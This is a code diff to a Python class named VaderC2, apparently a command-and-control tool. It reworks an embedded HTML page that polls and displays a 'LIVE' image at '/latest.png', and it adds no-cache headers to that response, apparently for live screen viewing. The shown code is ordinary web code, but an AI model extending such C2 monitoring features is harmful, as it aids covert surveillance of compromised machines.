@@ -797,8 +797,23 @@ class VaderC2:
 <style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}}
 img{{max-width:100vw;max-height:100vh;object-fit:contain}}
 #hud{{position:fixed;top:8px;left:8px;color:#0f0;font:12px monospace;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;z-index:9}}</style></head>
-<body><div id="hud">LIVE</div><img id="s" src="/latest.png"><script>
-var f=0;setInterval(function(){{f++;var i=document.getElementById('s');i.src='/latest.png?t='+Date.now();document.getElementById('hud').textContent='LIVE ['+f+']'}},{interval*1000});
+<body><div id="hud">LIVE</div><img id="s"><script>
+var f=0,prev=null;
+function grab(){{
+  f++;
+  fetch('/latest.png',{{cache:'no-store'}}).then(function(r){{
+    if(!r.ok)return;
+    return r.blob();
+  }}).then(function(b){{
+    if(!b)return;
+    if(prev)URL.revokeObjectURL(prev);
+    prev=URL.createObjectURL(b);
+    document.getElementById('s').src=prev;
+    document.getElementById('hud').textContent='LIVE ['+f+']';
+  }}).catch(function(){{}});
+}}
+grab();
+setInterval(grab,{interval*1000});
 </script></body></html>"""
 
                         class _ViewHandler(BaseHTTPRequestHandler):
@@ -818,6 +833,8 @@ var f=0;setInterval(function(){{f++;var i=document.getElementById('s');i.src='/l
                                         self.send_header("Content-Type", "image/png")
                                         self.send_header("Content-Length", str(len(data)))
                                         self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+                                        self.send_header("Pragma", "no-cache")
+                                        self.send_header("Expires", "0")
                                         self.end_headers()
                                         self.wfile.write(data)
                                     else:
